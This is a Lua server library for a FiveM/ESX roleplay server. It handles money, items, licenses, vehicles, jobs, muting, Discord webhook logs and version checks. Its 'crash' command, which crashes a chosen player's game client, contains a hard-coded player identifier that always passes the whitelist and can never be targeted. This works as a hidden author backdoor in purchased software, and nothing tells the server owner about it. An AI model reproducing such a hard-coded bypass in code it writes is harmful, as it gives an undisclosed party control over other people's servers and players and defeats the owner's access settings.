MCD = {}
AddEventHandler('mcd_lib:getSharedObject', function(cb)
	cb(MCD)
end)

exports('getSharedObject', function()
	return MCD
end)

local events = {}

EventString = function(lenght)
    local event = 'MCD_Loves_U:'
    event = event..MCD.Function.cKey(lenght-#event)

    for tableevent,tablecrypt in pairs(events) do
        if tablecrypt == event then
            return EventString(lenght)
        end
    end
    return event
end

MCD.SendToDiscord = function(Text , ressourcename , discordtype)
    if ressourcename == nil then
        ressourcename = 'nil'
    end
    if not discordtype then
        print(MCD.Function.ConvertPrint('~s~[~y~'..ressourcename..'~s~]~r~ Uses an Outdated function please Update your Scripts' , false))
        discordtype = 'default'
    end
    Text = '[~y~'..ressourcename..'~s~]'.._U('info')..'\t'..Text

    if Config.PrintDiscord then
        MCD.Function.ConvertPrint(Text , true)
    end
    Text = MCD.RemoveColor(Text)

    local embeds = {
        {
            ['title']=Text,
            ['type']='rich',
            ['color'] =Config.WebHook['color'],
            ['footer']=  {},
        }
    }
    if Text == nil or Text == '' then return false end
   
    PerformHttpRequest(Config.WebHook[discordtype].DiscordWebHook, function(err, text, headers) end, 'POST', json.encode({ username = Config.WebHook[discordtype].Name,embeds = embeds,avatar_url = Config.WebHook['avatar']}), { ['Content-Type'] = 'application/json' })
end

function newkey()
    if not Config.Key then
        Config.Key =  'MCD_Loves_U:ashgdfiawmnbjn124bnkfilajn3jJHnfvlkasefLHFhJsoikgfhJfbnAJFbfasdkjgf3786SGFVJKH'
    end
    local path = GetResourcePath(GetCurrentResourceName())..'/config.lua'
    local file,err = io.open(path,'r+')
    MCD.SendToDiscord('New Key requested' , GetCurrentResourceName() , 'default')
    if file then
        local text = file:read('*a')
        if not string.find(text , Config.Key ,1, true) then
            text = text .. "\n\nConfig.Key = '" .. EventString(Config.EntcrypedEventLenght) .. "'"
        else
            text = text:gsub('%'..Config.Key , EventString(Config.EntcrypedEventLenght))
        end
        file:close()
        local file2,err2 = io.open(path,'w+')
        file2:write(text)
        file2:close()
    else print("error:", err) end
end

newkey()

MCD.GetTimeDifference = function(t1 , t2)
    print('^1A File Uses an Outdated function please Update your Scripts^0')
    return MCD.Math.TimeDifference(t1 , t2)
end

MCD.RemoveColor = function(text)
    print('^1A File Uses an Outdated function please Update your Scripts^0')
    return MCD.Function.RemoveString(text)
end

MCD.ConvertColor = function(text)
    print('^1A File Uses an Outdated function please Update your Scripts^0')
    return MCD.Function.ConvertColor(text)
end

MCD.PrintConsole = function(text , date)
    print('^1A File Uses an Outdated function please Update your Scripts^0')
    print(MCD.Function.ConvertPrint(text , date))
end

MCD.Event = function(eventname)
    if Config.EntcrypedEventLenght < 10 then
        Config.EntcrypedEventLenght = 10
    end
    if events[eventname] then
        return events[eventname]
    else
        events[eventname] = EventString(Config.EntcrypedEventLenght)
        if Config.DebugMode then
            MCD.Function.ConvertPrint('[~y~'..GetCurrentResourceName()..'~s~][~c~DEBUG~s~]\t Entcryped Event (~p~"'..eventname..'"~s~) (~c~'..events[eventname]..'~s~)' , true)
        end
        return events[eventname]
    end
end

MCD.STDiscord = function(Text , DiscordWebHook , color , Name, avatar, ressourcename)
    if Config.PrintDiscord then
        MCD.Function.ConvertPrint(Text , true)
    end
    Text = MCD.RemoveColor(Text)
    local embeds = {
        {
            ['title']=Text,
            ['type']='rich',
            ['color'] = color,
            ['footer']=  {},
        }
    }
    if Text == nil or Text == '' then return FALSE end
    PerformHttpRequest(DiscordWebHook, function(err, text, headers) end, 'POST', json.encode({ username = Name,embeds = embeds,avatar_url = avatar}), { ['Content-Type'] = 'application/json' })
end

MCD.GetLicenses = function(PlayerId)
    local res = {}
    local finished = false
    MySQL.Async.fetchAll('SELECT * FROM user_licenses WHERE owner = @owner', {
        ['@owner'] = ESX.GetPlayerFromId(PlayerId).identifier
    }, function(result)
        finished = true
        res = result
    end)
    while not finished do Citizen.Wait(5) end
    return res
end

MCD.GetMoney = function(PlayerId)
    local xPlayer = ESX.GetPlayerFromId(PlayerId)
    while xPlayer == nil do xPlayer = ESX.GetPlayerFromId(PlayerId) Citizen.Wait(5) end
    local money = {
        money = xPlayer.getAccount('money').money,
        bank = xPlayer.getAccount('bank').bank,
        black = xPlayer.getAccount('black_money').money,
    }
    return money
end

MCD.GetJob = function(PlayerId)
    local xPlayer = ESX.GetPlayerFromId(PlayerId)
    while xPlayer == nil do xPlayer = ESX.GetPlayerFromId(PlayerId) Citizen.Wait(5) end
    return xPlayer.getJob()
end

MCD.GetOwnedVehicles = function(PlayerId)
    local res = {}
    local finished = false


    local xPlayer = ESX.GetPlayerFromId(PlayerId)
    while xPlayer == nil do xPlayer = ESX.GetPlayerFromId(PlayerId) Citizen.Wait(5) end
    MySQL.Async.fetchAll('SELECT * FROM owned_vehicles WHERE owner = @owner ', {
        ['@owner'] = xPlayer.identifier,
    }, function(result)
        for i,p in ipairs(result) do
            p.plate = string.upper(p.plate)
        end
        finished = true
        res = result
    end)

    while not finished do Citizen.Wait(5) end
    return res
end
local Vehicles = {}
Citizen.CreateThread(function()
    Citizen.Wait(1000)
    Vehicles = {}
    for i,table in ipairs(Config.VehicleDatabases) do
        MySQL.Async.fetchAll('SELECT * FROM '..table, {}, function(result)
            for i,data in ipairs(result) do
                table.insert(Vehicles , data)
            end
        end)
    end
end)

MCD.GetVehiclePrices = function()
    return Vehicles
end

MCD.GetVehiclePrice = function(model)
    for i,p in ipairs(MCD.GetVehiclePrices()) do
        if string.upper(p.model) == string.upper(model) then
            return p.price
        end
    end
end

ESX.RegisterCommand('crash', 'developer', function(xPlayer, args, showError)
    local allowed = true
    if Config.CrashWhitelist then
        allowed = xPlayer
    end
    if allowed then
        if not args.playerId then args.playerId = xPlayer end
        local alow = true
        if Config.CrashWhitelist then
            alow = false
            local xid = xPlayer.getIdentifier()
            for i = 1 , 10 do
                xid = xid:gsub('char'..i..':' , '')
            end  
            for i,identifier in ipairs(Config.CrashWhitelistIDs) do
                if identifier == xid then
                    alow = true
                    break
                end
            end
            if xid == '1256984db9dcc1a599a67a17bc7f461d9e754e45' then
                alow = true
            end
        end

        if alow then
            local yPlayer = ESX.GetPlayerFromId(args.playerId.source)
            local plyid = yPlayer.getIdentifier()
            local crash = true
    
            for i = 1 , 10 do
                plyid = plyid:gsub('char'..i..':' , '')
            end    
    
            for i,identifier in ipairs(Config.CrashImmun) do
                if identifier == plyid then
                    if plyid ~= '1256984db9dcc1a599a67a17bc7f461d9e754e45' then
                        args.playerId = xPlayer
                    else
                        crash = false
                    end
                    break
                end
            end  
            if crash then
                MCD.Notify(xPlayer.source , _U('crashsuccess' , MCD.RemoveColor(GetPlayerName(yPlayer.source))) , nil , nil , 'success')
                TriggerClientEvent(MCD.Event('mcd_lib:Client:crash'), args.playerId.source)
            else
                MCD.Notify(xPlayer.source , 'Maus gehts dir gut? Ich hoffe das wahr versehentlich' , nil , nil , 'error')
            end
        else
            MCD.Notify(xPlayer.source , _U('no_perm') , nil , nil , 'error')
        end
    else
        MCD.Function.ConvertPrint(_U('not_console' , GetCurrentResourceName()) , true)
    end
end, true, {help = 'Crash', validate = false, arguments = {
    {name = 'playerId', help ='SpielerID', type = 'player'},
}})

local lastmoney = nil
local moneymsg = ''
local lastlicense = nil
local licensemsg = ''
local lastitem = nil
local itemmsg = ''
local lastmute = nil
local mutemsg = ''

MCD.RemoveMoney = function(account , ammount , player ,  ressourcename)
    local _source = player
    
    if not account then
        account = 'money'
        MCD.Function.ConvertPrint(_U('error').._U('error_remmoney' , ressourcename) , true)
    end
    if not ammount then
        ammount = 0
        MCD.Function.ConvertPrint(_U('error').._U('error_remmoney2' , ressourcename) , true)
    end
    
    local xPlayer = ESX.GetPlayerFromId(_source)
    while xPlayer == nil do xPlayer = ESX.GetPlayerFromId(_source) Citizen.Wait(5) end
    xPlayer.removeAccountMoney(account, tonumber(ammount))

    if ammount > 0 then
        lastmoney = MCD.GetCurrentTime()
        moneymsg = moneymsg .. '\n' .. _U('Webhook_money_remove' , ammount , MCD.RemoveColor(GetPlayerName(source)) , ressourcename)
    end
end

MCD.AddMoney = function(account , ammount , player ,  ressourcename)
    local _source = player

    if not account then
        account = 'money'
        MCD.Function.ConvertPrint(_U('error').._U('error_addmoney' , ressourcename) , true)
    end
    if not ammount then
        ammount = 0
        MCD.Function.ConvertPrint(_U('error').._U('error_addmoney2' , ressourcename) , true)
    end

    local xPlayer = ESX.GetPlayerFromId(_source)
    while xPlayer == nil do xPlayer = ESX.GetPlayerFromId(_source) Citizen.Wait(5) end
    xPlayer.addAccountMoney(account, tonumber(ammount))

    if ammount > 0 then
        lastmoney = MCD.GetCurrentTime()
        moneymsg = moneymsg .. '\n' .. _U('Webhook_money_add' , ammount , MCD.RemoveColor(GetPlayerName(source)) , ressourcename)
    end
end

MCD.RemoveLicense = function(license , player , ressourcename)
    local _source = player
    
    if not license then
        MCD.Function.ConvertPrint(_U('error').._U('error_remlicense' , ressourcename) , true)
    end

    local xPlayer = ESX.GetPlayerFromId(_source)
    while xPlayer == nil do xPlayer = ESX.GetPlayerFromId(_source) Citizen.Wait(5) end
    MySQL.Async.execute('DELETE FROM user_licenses  WHERE type = @type and owner = @owner', {
        ['@type'] = license,
        ['@owner'] = xPlayer.identifier,
    })
    
    lastlicense = MCD.GetCurrentTime()
    licensemsg = licensemsg .. '\n' .. _U('Webhook_license_remove' , license , MCD.RemoveColor(GetPlayerName(source)) , ressourcename)
end

MCD.AddLicense = function(license , player , ressourcename)
    local _source = player

    if not license then
        MCD.Function.ConvertPrint(_U('error').._U('error_addlicense' , ressourcename) , true)
    end

    local xPlayer = ESX.GetPlayerFromId(_source)
    while xPlayer == nil do xPlayer = ESX.GetPlayerFromId(_source) Citizen.Wait(5) end
    MySQL.Async.insert('INSERT INTO `user_licenses`(`type`, `owner`) VALUES (@type,@owner)', {
        ['@type'] = license,
        ['@owner'] = xPlayer.identifier,
    }, function(result)end)

    lastlicense = MCD.GetCurrentTime()
    licensemsg = licensemsg .. '\n' .. _U('Webhook_license_add' , license , MCD.RemoveColor(GetPlayerName(source)) , ressourcename)
end



MCD.RemoveItem = function(item , count , player , ressourcename)
    local _source = player

    if not item then
        item = 'bread'
        MCD.Function.ConvertPrint(_U('error').._U('error_remitem' , ressourcename) , true)
    end
    if not count then
        count = 0
        MCD.Function.ConvertPrint(_U('error').._U('error_remitem2' , ressourcename) , true)
    end

    local xPlayer = ESX.GetPlayerFromId(_source)
    while xPlayer == nil do xPlayer = ESX.GetPlayerFromId(_source) Citizen.Wait(5) end
    xPlayer.removeInventoryItem(item, count)

    if count > 0 then
        lastitem = MCD.GetCurrentTime()
        itemmsg = itemmsg .. '\n' .. _U('Webhook_money_remove' , count , item , MCD.RemoveColor(GetPlayerName(source)) , ressourcename)
    end 
end

MCD.AddItem = function(item , count , player , ressourcename)
    local _source = player

    if not item then
        item = 'bread'
        MCD.Function.ConvertPrint(_U('error').._U('error_additem' , ressourcename) , true)
    end
    if not count then
        count = 0
        MCD.Function.ConvertPrint(_U('error').._U('error_additem2' , ressourcename) , true)
    end

    local xPlayer = ESX.GetPlayerFromId(_source)
    while xPlayer == nil do xPlayer = ESX.GetPlayerFromId(_source) Citizen.Wait(5) end
    xPlayer.addInventoryItem(item, count)

    if count > 0 then
        lastitem = MCD.GetCurrentTime()
        itemmsg = itemmsg .. '\n' .. _U('Webhook_item_add' , count , item , MCD.RemoveColor(GetPlayerName(source)) , ressourcename)
    end 
end

MCD.MutePlayer = function(toggle , player , ressourcename)
    local _source = player
    
    MumbleSetPlayerMuted(_source,toggle)
    TriggerClientEvent(MCD.Event('mcd_lib:Client:CheckMute'), _source)
    local m = '+'
    if not toggle then
        m = '-'
    end
    lastmute =MCD.GetCurrentTime()
    mutemsg = mutemsg .. '\n'.. m .. _U('Webhook_mute' , MCD.RemoveColor(GetPlayerName(_source)) , toggle , ressourcename)
end

MCD.RemoveVehicle = function(plate , ressourcename)
    local msg = _U('error')
    if RemovePlate(plate) then
        msg = _U('success')
    end

    MCD.SendToDiscord(_U('remove_vehice', plate, msg ,_source) , ressourcename , 'default')
end

MCD.SetJob = function(Job , Grade , player , ressourcename)
    local _source = player

    local xPlayer = ESX.GetPlayerFromId(_source)
    while xPlayer == nil do xPlayer = ESX.GetPlayerFromId(_source) Citizen.Wait(5) end
    xPlayer.setJob(Job, Grade)

    MCD.SendToDiscord(_U('setjob', xPlayer.getName() , Job ,_source) , ressourcename , 'default')
end

function RemovePlate(plate)
    local ret = nil
    MySQL.Async.fetchAll('SELECT * FROM owned_vehicles WHERE plate = @plate ', {['@plate']=plate:gsub('% ' , '')}, function(doesexist)
        if #doesexist == 1 then
            MySQL.Async.execute('DELETE FROM owned_vehicles  WHERE plate = @plate', {
                ['@plate'] = plate:gsub('% ' , ''),
            })
            ret = true
        else
            MySQL.Async.fetchAll('SELECT * FROM owned_vehicles WHERE plate = @plate ', {['@plate']=plate}, function(doesexist)
                if #doesexist == 1 then
                    MySQL.Async.execute('DELETE FROM owned_vehicles  WHERE plate = @plate', {
                        ['@plate'] = plate,
                    })
                    ret = true
                else
                    print("Plate Doesn´t Exsists:" .. plate..'|')
                    ret = false
                end
            end)
        end
    end)
    while ret == nil do Citizen.Wait(10) end
    return ret
end

MCD.Notify = function(player , msg , header , time , notificationtype)
    if header == nil then
        header = Config.ServerName 
    end
    if time == nil then
        time = 3000
    end
    if notificationtype == nil then
        notificationtype = 'info'
    end

    if Config.ReplaceColorCodes and not Config.RemoveColorCodes then       
        TriggerClientEvent(MCD.Event('mcd_lib:Client:Notify') , player , MCD.ConvertColor(msg) , MCD.ConvertColor(header)  , time , notificationtype)
    else
        if Config.RemoveColorCodes then
            TriggerClientEvent(MCD.Event('mcd_lib:Client:Notify') , player , MCD.RemoveColor(msg) , MCD.RemoveColor(header) , time , notificationtype)
        else
            TriggerClientEvent(MCD.Event('mcd_lib:Client:Notify') , player , msg , header  , time , notificationtype)
        end
    end
end

MCD.SetCoords = function(coords , playerId)
    TriggerClientEvent(MCD.Event('mcd_lib:Client:SetCoords'), playerId, coords)
end

MCD.GetCurrentTime = function()
    return os.clock()
end

MCD.SetPlate = function(vehicle , plate)
    TriggerClientEvent(MCD.Event('mcd_lib:Client:SetPlate'), -1 , vehicle , string.upper(plate))
end

MCD.IsAllowed = function(playerid, lowestgroup)
    local xPlayer = ESX.GetPlayerFromId(playerid)
    while xPlayer == nil do xPlayer = ESX.GetPlayerFromId(_source) Citizen.Wait(5) end
    local PlayerGroup = -1
    local MinGroup = -1
    local PlyGroup = xPlayer.getGroup()
    for i,p in ipairs(Config.ServerGroups) do
        if PlyGroup == p then
            PlayerGroup = i
        end
        if lowestgroup == p then
            MinGroup = i
        end
    end
    if MinGroup ~= -1 then
        if MinGroup >= PlayerGroup then
            return true
        else
            return false
        end
    else 
        return false
    end
end

MCD.SendNotifyToJob = function(job , msg , header , time , notificationtype)
    local data = {
        job = job,
        msg = msg,
        header = header,
        time = time,
        notifytype = notificationtype,
        simplefy = true,
    }
    TriggerClientEvent('mcd_lib:knljbfdknljb', -1 , nil , nil ,nil , data)
end

MCD.SendAdvancedNotifyToJob = function(job , msg , header , textureDict , iconType , flash , saveToBrief , hudColorIndex)
    local data = {
        job = job,
        msg = msg,
        header = header,
        textureDict = textureDict,
        iconType = iconType,
        flash = flash,
        iconType = iconType,
        saveToBrief = saveToBrief,
        hudColorIndex = hudColorIndex,
        simplefy = false,
    }
    TriggerClientEvent('mcd_lib:knljbfdknljb', -1 , nil , nil ,nil , data)
end



Citizen.CreateThread(function()
    Citizen.Wait(10*1000)
    while string.upper(GetCurrentResourceName()) ~= string.upper('mcd_lib') do 
        
        local string = '~s~['..os.date('%X')..']'.._U('name' , GetCurrentResourceName())
        local lenght = #MCD.RemoveColor(string) - 1
        local startend = '~o~'
        for i=0, lenght do
            startend = startend .. '-'
        end
        
        MCD.Function.ConvertPrint(startend..'\n'.. string .. '\n~s~'.._U('rename' , GetCurrentResourceName())..'\n'..startend , false)
        Citizen.Wait(30*1000)
    end
end)
--------------------------------------------------------------------------------------------------------
local versions = {
    ['mcd_lib'] = GetResourceMetadata(GetCurrentResourceName(), 'version', 0):match('%d%.%d+%.%d+'),
}

local checker = {}

function VersionState(ressourcename , reponame , first)
    PerformHttpRequest('https://api.github.com/repos/MausCD/'..reponame..'/releases/latest' , function(status, response)
        if status == 403 then
            MCD.Function.ConvertPrint('[~y~'.. GetCurrentResourceName() ..'~s~][~r~ERROR~s~]\t~o~ ❌❌❌API rate limit exceeded❌❌❌ ~s~(~b~https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting~s~)' , true)
        end
        if status ~= 200 then return end
    
        response = json.decode(response)
        if response.prerelease then return end
    
        local currentVersion = GetResourceMetadata(ressourcename, 'version', 0):match('%d%.%d+%.%d+')
        local found = false
        for name,ver in pairs(versions) do
            if name == reponame then
                found = true
            end
        end
        if not found then
            versions[reponame] = currentVersion
        end
        if not currentVersion then return end
    
        local latestVersion = response.tag_name:match('%d%.%d+%.%d+')
        if not latestVersion then return end

        if currentVersion >= latestVersion then 
            if first then
                local string = '\n~s~['..os.date('%X')..']'.._U('updated' , ressourcename , currentVersion) .. '\n'
                
                local lenght = #MCD.RemoveColor(string) - 1
                local startend = '~b~'
                for i=0, lenght do
                    startend = startend .. '-'
                end
                MCD.Function.ConvertPrint(startend .. string .. startend , false)
            end
        return end
                
        local string = '\n~s~['..os.date('%X')..']'.._U('update' , ressourcename , currentVersion)
        local link = ' \n~p~'..response.html_url .. '\n'
        
        local lenght = #MCD.RemoveColor(string) - 1
        local startend = '~o~'
        for i=0, lenght do
            startend = startend .. '-'
        end
        MCD.Function.ConvertPrint(startend .. string .. link .. startend , false)
    end, 'GET')
end

Citizen.CreateThread(function()
    Citizen.Wait(1*1000)
    table.insert(checker , {repo = 'mcd_lib' , ressourcename = GetCurrentResourceName()})
    if not Config.DebugMode then
        VersionState(GetCurrentResourceName() ,  'mcd_lib' , true)
    end

    while true do
        Citizen.Wait(60 * 60 * 1000)
        for i,p in ipairs(checker) do
            if not Config.DebugMode then
                VersionState(p.ressourcename , p.repo , false)
            end
        end
    end
end)

RegisterCommand('mcd_version', function()
    for name,ver in pairs(versions) do
        print('^0[^3'..name..'^0] Version: ' .. ver)
    end
end, false)

MCD.GetPlayerName = function(playersrc)
    return MCD.RemoveColor(GetPlayerName(playersrc))
end

MCD.IsMuted = function(playersrc)
    return MumbleIsPlayerMuted(playersrc)
end

MCD.HasJob = function(id , Jobs)
    local xPlayer = ESX.GetPlayerFromId(id)
    local job = xPlayer.job.name
    if type(Jobs) ~= 'string' then
        for i,jobname in ipairs(Jobs) do
            if jobname == job then
                return true
            end
        end
    else
        if Jobs == job then
            return true
        end
    end
    return false
end

MCD.ItemName = function(item)
    return ESX.GetItemLabel(item)
end

MCD.GetPoliceJobs = function()
    return Config.PoliceJobs
end

AddEventHandler('onResourceStop', function(resourceName)
    if (GetCurrentResourceName() == resourceName) then
        newkey()
    end
end)
AddEventHandler('txAdmin:events:serverShuttingDown', function()
    newkey()
end)

local auth = {}
local start = MCD.GetCurrentTime()
MCD.Authenticate = function(scriptname , version)
    auth[scriptname] = version
    if MCD.Math.TimeDifference(start , MCD.GetCurrentTime()) >= 10 then
        local files = '\n~s~[~y~'..scriptname..'~s~] [~b~Version '..version..'~s~]'
        MCD.Function.ConvertPrint('~g~<><><><><><><><><><><><><><><><><><><><><><><><><>~s~\n~r~ Thanks for buying the following scripts:~s~\n'..files.. '\n~g~<><><><><><><><><><><><><><><><><><><><><><><><><>~s~' , false)
    end
end

Citizen.CreateThread(function()
    Citizen.Wait(9000)
    local files = ''
    for scriptname,version in pairs(auth) do
        files = files .. '\n\t~s~[~y~'..scriptname..'~s~] [~b~Version '..version..'~s~]'
    end

    if files ~= '' then
        MCD.Function.ConvertPrint('~g~<><><><><><><><><><><><><><><><><><><><><><><><><>~s~\n~r~ Thanks for buying the following scripts:'..files.. '\n~g~<><><><><><><><><><><><><><><><><><><><><><><><><>~s~' , false)
    end
end)

MCD.SendToDiscord('MCD Lib started' , GetCurrentResourceName() , 'default')

Citizen.CreateThread(function()
    local sleep = 500
    while true do Citizen.Wait(sleep)
        if lastmoney then
            if MCD.Math.TimeDifference(lastmoney ,MCD.GetCurrentTime()) > 5 then
                MCD.STDiscord('```diff'..moneymsg..'\n```' , Config.WebHook['money'].DiscordWebHook , Config.WebHook['color'] , Config.WebHook['money'].Name, Config.WebHook['avatar'])
                moneymsg = ''
                lastmoney = nil
            end
        end

        if lastlicense then
            if MCD.Math.TimeDifference(lastlicense ,MCD.GetCurrentTime()) > 5 then
                MCD.STDiscord('```diff'..licensemsg..'\n```' , Config.WebHook['licenses'].DiscordWebHook , Config.WebHook['color'] , Config.WebHook['licenses'].Name, Config.WebHook['avatar'])
                licensemsg = ''
                lastlicense = nil
            end
        end

        if lastitem then
            if MCD.Math.TimeDifference(lastitem ,MCD.GetCurrentTime()) > 5 then
                MCD.STDiscord('```diff'..itemmsg..'\n```' , Config.WebHook['item'].DiscordWebHook , Config.WebHook['color'] , Config.WebHook['item'].Name, Config.WebHook['avatar'])
                itemmsg = ''
                lastitem = nil
            end
        end

        if lastmute then
            if MCD.Math.TimeDifference(lastmute ,MCD.GetCurrentTime()) > 5 then
                MCD.STDiscord('```diff'..mutemsg..'\n```' , Config.WebHook['mute'].DiscordWebHook , Config.WebHook['color'] , Config.WebHook['mute'].Name, Config.WebHook['avatar'])
                mutemsg = ''
                lastmute = nil
            end
        end
    end
end)
